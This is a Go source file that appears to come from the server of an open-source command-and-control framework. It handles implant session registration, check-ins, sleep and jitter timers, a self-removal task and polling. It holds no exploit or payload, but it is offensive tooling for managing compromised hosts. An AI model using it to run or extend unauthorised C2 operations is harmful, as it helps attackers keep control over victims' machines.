package rpc

import (
	"context"
	"fmt"
	"github.com/chainreactors/logs"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/errs"
	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
	"github.com/chainreactors/malice-network/helper/proto/implant/implantpb"
	"github.com/chainreactors/malice-network/helper/types"
	"time"

	"github.com/chainreactors/malice-network/server/internal/core"
	"github.com/chainreactors/malice-network/server/internal/db"
)

func (rpc *Server) Register(ctx context.Context, req *clientpb.RegisterSession) (*clientpb.Empty, error) {
	var err error
	sess, err := core.Sessions.Get(req.SessionId)
	if err != nil {
		sess, err = core.RegisterSession(req)
		if err != nil {
			return nil, err
		}
		sess.LastCheckin = getTimestamp(ctx)
		d := db.Session().Create(sess.ToModel())
		if d.Error != nil {
			return nil, err
		} else {
			sess.Publish(consts.CtrlSessionRegister, fmt.Sprintf("new session %s from %s start at %s", sess.Abstract(), sess.Target, sess.PipelineID), true, true)
			logs.Log.Importantf("recover session %s from %s", sess.ID, sess.PipelineID)
		}
	} else {
		logs.Log.Infof("session %s re-register", sess.ID)
		sess.Update(req)
		sess.Publish(consts.CtrlSessionReborn, fmt.Sprintf("%s from %s reborn at %s", sess.Abstract(), sess.Target, sess.PipelineID), true, true)
		core.Sessions.Add(sess)
	}

	return &clientpb.Empty{}, nil
}

func (rpc *Server) SysInfo(ctx context.Context, req *implantpb.SysInfo) (*clientpb.Empty, error) {
	id, err := getSessionID(ctx)
	if err != nil {
		return nil, err
	}
	sess, err := core.Sessions.Get(id)
	if err != nil {
		return nil, err
	}
	sess.UpdateSysInfo(req)
	return &clientpb.Empty{}, nil
}

func (rpc *Server) Checkin(ctx context.Context, req *implantpb.Ping) (*clientpb.Empty, error) {
	sid, err := getSessionID(ctx)
	if err != nil {
		return nil, err
	}
	var sess *core.Session
	if sess, err = core.Sessions.Get(sid); err != nil {
		dbSess, err := db.FindSession(sid)
		if err != nil {
			return nil, err
		} else if dbSess == nil {
			return nil, nil
		}
		dbSess.LastCheckin = getTimestamp(ctx)
		sess, err = core.RecoverSession(dbSess)
		if err != nil {
			return nil, err
		}
		core.Sessions.Add(sess)
		sess.Publish(consts.CtrlSessionReborn, fmt.Sprintf("session %s from %s reborn at %s", sess.Abstract(), sess.Target, sess.PipelineID), true, true)
		logs.Log.Debugf("recover session %s", sid)
	}
	sess.LastCheckin = getTimestamp(ctx)
	sess.Publish(consts.CtrlSessionCheckin, "", false, false)

	return &clientpb.Empty{}, nil
}

// sleep
func (rpc *Server) Sleep(ctx context.Context, req *implantpb.Timer) (*clientpb.Task, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}
	ch, err := rpc.GenericHandler(ctx, greq)
	if err != nil {
		return nil, err
	}

	go greq.HandlerResponse(ch, types.MsgEmpty)
	if session, err := getSession(ctx); err == nil {
		session.Jitter = req.Jitter
		session.Interval = req.Interval
		core.Sessions.Add(session)
		err := db.UpdateSessionTimer(session.ID, req.Interval, req.Jitter)
		if err != nil {
			return nil, err
		}
	} else {
		return nil, err
	}
	return greq.Task.ToProtobuf(), nil
}

func (rpc *Server) Suicide(ctx context.Context, req *implantpb.Request) (*clientpb.Task, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}
	ch, err := rpc.GenericHandler(ctx, greq)
	if err != nil {
		return nil, err
	}

	go greq.HandlerResponse(ch, types.MsgEmpty)
	return greq.Task.ToProtobuf(), nil
}

func (rpc *Server) InitBindSession(ctx context.Context, req *implantpb.Request) (*clientpb.Empty, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}
	_, err = rpc.GenericHandler(ctx, greq)
	if err != nil {
		return nil, err
	}
	return &clientpb.Empty{}, nil
}

func hasIntersection(slice1, slice2 []uint32) bool {
	set := make(map[uint32]struct{})

	for _, v := range slice1 {
		set[v] = struct{}{}
	}

	for _, v := range slice2 {
		if _, exists := set[v]; exists {
			return true
		}
	}

	return false
}

func (rpc *Server) Polling(ctx context.Context, req *clientpb.Polling) (*clientpb.Empty, error) {
	sess, err := core.Sessions.Get(req.SessionId)
	if err != nil {
		return nil, errs.ErrNotFoundSession
	}
	go func() {
		logs.Log.Debugf("polling:%s %s, interval %d", req.Id, sess.ID, req.Interval)
		sess.Any[req.Id] = true
		defer func() {
			delete(sess.Any, req.Id)
			logs.Log.Debugf("polling:%s %s done", req.Id, sess.ID)
		}()
		for {
			if _, ok := sess.SessionContext.GetAny(req.Id); !ok {
				break
			}
			if !req.Force {
				// 如果不为force, 且所有需要等待的任务都已经完成, 则退出轮询
				tasks := sess.Tasks.All()
				var notfinishedId []uint32
				for _, task := range tasks {
					if task.Finished() {
						continue
					}
					notfinishedId = append(notfinishedId, task.Id)
				}

				if !hasIntersection(req.Tasks, notfinishedId) {
					break
				}
			}
			err = sess.Request(
				&clientpb.SpiteRequest{Session: sess.ToProtobufLite(), Task: nil, Spite: types.BuildPingSpite()},
				pipelinesCh[sess.PipelineID])
			if err != nil {
				return
			}
			time.Sleep(time.Duration(req.Interval))
		}
	}()
	return &clientpb.Empty{}, err
}
